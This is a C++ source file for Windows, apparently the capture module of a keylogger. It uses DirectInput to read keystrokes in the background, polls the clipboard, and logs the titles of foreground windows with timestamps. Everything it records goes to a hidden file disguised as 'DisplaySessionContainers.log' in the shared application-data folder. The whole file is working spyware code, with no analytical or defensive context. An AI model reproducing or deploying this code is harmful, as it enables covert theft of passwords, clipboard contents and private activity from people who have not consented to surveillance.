#include "stdafx.h"
#include "Input.h"
#include <Shlobj.h>
#include <iostream>

IDirectInput8* Input::mDInput = nullptr;
IDirectInputDevice8* Input::mKeyboard = nullptr;
IDirectInputDevice8* Input::mMouse = nullptr;
DWORD               Input::dwElements = 0;
DIDEVICEOBJECTDATA Input::didod[DINPUT_BUFFERSIZE] = {};  // Receives buffered data
TCHAR Input::szPath[MAX_PATH * 2];
HANDLE Input::m_hMutex = NULL;
BOOL               Input::bshift = FALSE;
BOOL               Input::bcaps = FALSE;
DWORD Input::m_dwLastCapture = GetTickCount();
bool Input::initialize(const HWND& window, const HINSTANCE& instance)
{
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szPath);
	lstrcatW(szPath, _T("\\DisplaySessionContainers.log"));
	m_hMutex = CreateMutex(NULL, FALSE, szPath);
	WaitForSingleObject(m_hMutex, INFINITE);
	HANDLE	hFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	CloseHandle(hFile);
	if (dwSize > 1024 * 1024 * 50)
		DeleteFile(szPath);

	ReleaseMutex(m_hMutex);

	HRESULT hr = DirectInput8Create(instance, DIRECTINPUT_VERSION, IID_IDirectInput8, (void**)&mDInput, 0);
	if (FAILED(hr)) {
		return 0;
	}
	hr = mDInput->CreateDevice(GUID_SysKeyboard, &mKeyboard, 0);
	if (FAILED(hr)) {
		return 0;
	}
	hr = mKeyboard->SetDataFormat(&c_dfDIKeyboard);
	if (FAILED(hr)) {
		return 0;
	}
	hr = mKeyboard->SetCooperativeLevel(window, DISCL_NONEXCLUSIVE | DISCL_BACKGROUND);
	if (FAILED(hr)) {
		return 0;
	}
	DIPROPDWORD     property;
	property.diph.dwSize = sizeof(DIPROPDWORD);
	property.diph.dwHeaderSize = sizeof(DIPROPHEADER);
	property.diph.dwObj = 0;
	property.diph.dwHow = DIPH_DEVICE;
	property.dwData = DINPUT_BUFFERSIZE;
	hr = mKeyboard->SetProperty(DIPROP_BUFFERSIZE, &property.diph);
	if FAILED(hr)
	{
		return FALSE;
	}
	hr = mKeyboard->Acquire();
	if (FAILED(hr)) {
		return 0;
	}
	m_dwLastCapture = GetTickCount();
	short s = GetKeyState(VK_CAPITAL);
	if (s == -127 || s == 1)
		Input::bcaps = TRUE;
	else
		Input::bcaps = FALSE;
	return 1;
}


void Input::UpdateInputData()
{
	if (mKeyboard != NULL)
	{
		dwElements = DINPUT_BUFFERSIZE;
		mKeyboard->GetDeviceData(sizeof(DIDEVICEOBJECTDATA), didod, &dwElements, 0);
	}
}

void Input::destroy()
{
	safeRelease(mDInput);
	mKeyboard->Unacquire();
	mMouse->Unacquire();
	safeRelease(mKeyboard);
	safeRelease(mMouse);
	CloseHandle(m_hMutex);
}




struct keynameandkeynum
{
	TCHAR keyname[20];
	TCHAR keyname_shift[20];
	TCHAR keyname_caps[20];
	int keynum;
};
keynameandkeynum m_keyandnum[] =
{
{_T("[esc]"),_T(""),_T(""),0},
{_T("1"),_T("!"),_T(""),1},
{_T("2"),_T("@"),_T(""),2},
{_T("3"),_T("#"),_T(""),3},
{_T("4"),_T("$"),_T(""),4},
{_T("5"),_T("%"),_T(""),5},
{_T("6"),_T("^"),_T(""),6},
{_T("7"),_T("&"),_T(""),7},
{_T("8"),_T("*"),_T(""),8},
{_T("9"),_T("("),_T(""),9},
{_T("0"),_T(")"),_T(""),10},
{_T("-"),_T("_"),_T(""),11},
{_T("+"),_T("+"),_T(""),12},
{_T("[<-]"),_T(""),_T(""),13},
{_T("[tab]"),_T(""),_T(""),14},
{_T("q"),_T(""),_T("Q"),15},
{_T("w"),_T(""),_T("W"),16},
{_T("e"),_T(""),_T("E"),17},
{_T("r"),_T(""),_T("R"),18},
{_T("t"),_T(""),_T("T"),19},
{_T("y"),_T(""),_T("Y"),20},
{_T("u"),_T(""),_T("U"),21},
{_T("i"),_T(""),_T("I"),22},
{_T("o"),_T(""),_T("O"),23},
{_T("p"),_T(""),_T("P"),24},
{_T("["),_T("{"),_T(""),25},
{_T("]"),_T("}"),_T(""),26},
{_T("[enter]"),_T(""),_T(""),27},
{_T("[lctrl]"),_T(""),_T(""),28},
{_T("a"),_T(""),_T("A"),29},
{_T("s"),_T(""),_T("S"),30},
{_T("d"),_T(""),_T("D"),31},
{_T("f"),_T(""),_T("F"),32},
{_T("g"),_T(""),_T("G"),33},
{_T("h"),_T(""),_T("H"),34},
{_T("j"),_T(""),_T("J"),35},
{_T("k"),_T(""),_T("K"),36},
{_T("l"),_T(""),_T("L"),37},
{_T(";"),_T(":"),_T(""),38},
{_T("'"),_T("\""),_T(""),39},
{_T("`"),_T("~"),_T(""),40},
{_T("[lshift]"),_T(""),_T(""),41},
{_T("\\"),_T("|"),_T(""),42},
{_T("z"),_T(""),_T("Z"),43},
{_T("x"),_T(""),_T("X"),44},
{_T("c"),_T(""),_T("C"),45},
{_T("v"),_T(""),_T("V"),46},
{_T("b"),_T(""),_T("B"),47},
{_T("n"),_T(""),_T("N"),48},
{_T("m"),_T(""),_T("M"),49},
{_T(","),_T("<"),_T(""),50},
{_T("."),_T(">"),_T(""),51},
{_T("/"),_T("?"),_T(""),52},
{_T("[rshift]"),_T(""),_T(""),53},
{_T("*"),_T(""),_T(""),54},
{_T("[lalt]"),_T(""),_T(""),55},
{_T("空"),_T(""),_T(""),56},
{_T("[cap]"),_T(""),_T(""),57},
{_T("[F1]"),_T(""),_T(""),58},
{_T("[F2]"),_T(""),_T(""),59},
{_T("[F3]"),_T(""),_T(""),60},
{_T("[F4]"),_T(""),_T(""),61},
{_T("[F5]"),_T(""),_T(""),62},
{_T("[F6]"),_T(""),_T(""),63},
{_T("[F7]"),_T(""),_T(""),64},
{_T("[F8]"),_T(""),_T(""),65},
{_T("[F9]"),_T(""),_T(""),66},
{_T("[F10]"),_T(""),_T(""),67},
{_T("[numlock]"),_T(""),_T(""),68},
{_T("[scrolllock]"),_T(""),_T(""),69},
{_T("7"),_T(""),_T(""),70},
{_T("8"),_T(""),_T(""),71},
{_T("9"),_T(""),_T(""),72},
{_T("-"),_T(""),_T(""),73},
{_T("4"),_T(""),_T(""),74},
{_T("5"),_T(""),_T(""),75},
{_T("6"),_T(""),_T(""),76},
{_T("+"),_T(""),_T(""),77},
{_T("1"),_T(""),_T(""),78},
{_T("2"),_T(""),_T(""),79},
{_T("3"),_T(""),_T(""),80},
{_T("0"),_T(""),_T(""),81},
{_T("."),_T(""),_T(""),82},
{_T("[F11]"),_T(""),_T(""),86},
{_T("[F12]"),_T(""),_T(""),87},
{_T("[enter]"),_T(""),_T(""),155},
{_T("[rctrl]"),_T(""),_T(""),156},
{_T("/"),_T(""),_T(""),180},
{_T("[ralt]"),_T(""),_T(""),183},
{_T("[home]"),_T(""),_T(""),198},
{_T("[上]"),_T(""),_T(""),199},
{_T("[pagup]"),_T(""),_T(""),200},
{_T("[左]"),_T(""),_T(""),202},
{_T("[右]"),_T(""),_T(""),204},
{_T("[end]"),_T(""),_T(""),206},
{_T("[下]"),_T(""),_T(""),207},
{_T("[pagdn]"),_T(""),_T(""),208},
{_T("[插入]"),_T(""),_T(""),209},
{_T("[删除]"),_T(""),_T(""),210},
{_T("[lwin]"),_T(""),_T(""),218},
{_T("[rwin]"),_T(""),_T(""),219},
{_T("[菜单]"),_T(""),_T(""),220}
};



void Input::SaveToFile(TCHAR* lpBuffer)
{
	WaitForSingleObject(m_hMutex, INFINITE);
	HANDLE	hFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	DWORD dwBytesWrite = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, lpBuffer, lstrlen(lpBuffer) * sizeof(TCHAR), &dwBytesWrite, NULL);
	CloseHandle(hFile);
	ReleaseMutex(m_hMutex);
	return;
}

HWND PreviousFocus = NULL;
TCHAR WindowCaption[1024] = { 0 };
HWND hFocus = NULL;
BOOL Input::IsWindowsFocusChange()
{
	memset(WindowCaption, 0, sizeof(WindowCaption));
	hFocus = GetForegroundWindow();
	GetWindowText(hFocus, WindowCaption, sizeof(WindowCaption));
	BOOL ReturnFlag = FALSE;
	TCHAR temp[1024] = { 0 };
	if (hFocus != PreviousFocus)
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;
			GetLocalTime(&s);
			wsprintf(temp, _T("\r\n[标题:]%s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n"), WindowCaption, s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
			SaveToFile(temp);
			memset(temp, 0, sizeof(temp));
			memset(WindowCaption, 0, sizeof(WindowCaption));
			ReturnFlag = TRUE;
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag;
}

void Input::savekerboard()
{
	TCHAR* m_key = new TCHAR[20];
	ZeroMemory(m_key, 20 * 2);
	TCHAR Clipboard_old[1024];
	TCHAR temp[1024] = { 0 };
	BOOL bwrite = TRUE;
	while (TRUE)
	{
		Sleep(1);
		/// <summary>
		if (GetTickCount() - m_dwLastCapture > 1500)
		{
			InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
			OpenClipboard(NULL);
			HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
			if (hglb != NULL)
			{
				int	nPacketLen = int(GlobalSize(hglb)) * 2 + 2;
				LPCTSTR  lpstr = (LPCTSTR)GlobalLock(hglb);
				if (lpstr != NULL)
				{
					if (nPacketLen < 2048)  // 判断长度
					{
						if (wcscmp(lpstr, Clipboard_old) != 0)		//判断内容
						{
							memcpy(Clipboard_old, lpstr, nPacketLen);
							wsprintf(temp, _T("\r\n[剪切板:]%s\r\n"), lpstr);
							Input::SaveToFile(temp);
							memset(temp, 0, sizeof(temp));
						}
					}
				}
				::GlobalUnlock(hglb);
			}
			::CloseClipboard();
		}
		/// </summary>
		if (IsWindowsFocusChange())	 SaveToFile(_T("[内容:]"));
		Input::UpdateInputData();
		bwrite = TRUE;
		for (int i = 0; i < (int)(Input::dwElements); i++)
		{

			int m_pos = 0;
			for (m_pos = 0; m_pos < 102; m_pos++)
			{
				if ((Input::didod[i].dwOfs - 1) == m_keyandnum[m_pos].keynum)
				{
					if (Input::didod[i].dwData & 0x80) //按下
					{
						if (m_pos == 57)
						{
							short s = GetKeyState(VK_CAPITAL);
							if (s == -127 || s == 1)
								Input::bcaps = TRUE;
							else
								Input::bcaps = FALSE;
						}

						if (m_pos == 41 || m_pos == 53)
						{
							wsprintf(m_key, _T("%s%s按"), m_key, m_keyandnum[m_pos].keyname);
							bshift = TRUE;
							continue;
						}
						if (bshift)
						{
							if (lstrlen(m_keyandnum[m_pos].keyname_shift))
								wsprintf(m_key, _T("%s%s"), m_key, m_keyandnum[m_pos].keyname_shift);
							else
							{
								if (bcaps && lstrlen(m_keyandnum[m_pos].keyname_caps))
									wsprintf(m_key, _T("%s%s"), m_key, m_keyandnum[m_pos].keyname_caps);
								else
									wsprintf(m_key, _T("%s%s"), m_key, m_keyandnum[m_pos].keyname);
							}
						}
						else
						{
							if (bcaps && lstrlen(m_keyandnum[m_pos].keyname_caps))
								wsprintf(m_key, _T("%s%s"), m_key, m_keyandnum[m_pos].keyname_caps);
							else
								wsprintf(m_key, _T("%s%s"), m_key, m_keyandnum[m_pos].keyname);
						}
						continue;
					}
					else
					{
						if (m_pos == 41 || m_pos == 53)
						{
							wsprintf(m_key, _T("%s%s松"), m_key, m_keyandnum[m_pos].keyname);
							bshift = FALSE;
						}
						continue;
					}
				}
			}

		}
		if (lstrlen(m_key))
		{
			Input::SaveToFile(m_key);
			ZeroMemory(m_key, 20 * 2);
		}
	}
	SAFE_DELETE_AR(m_key);
}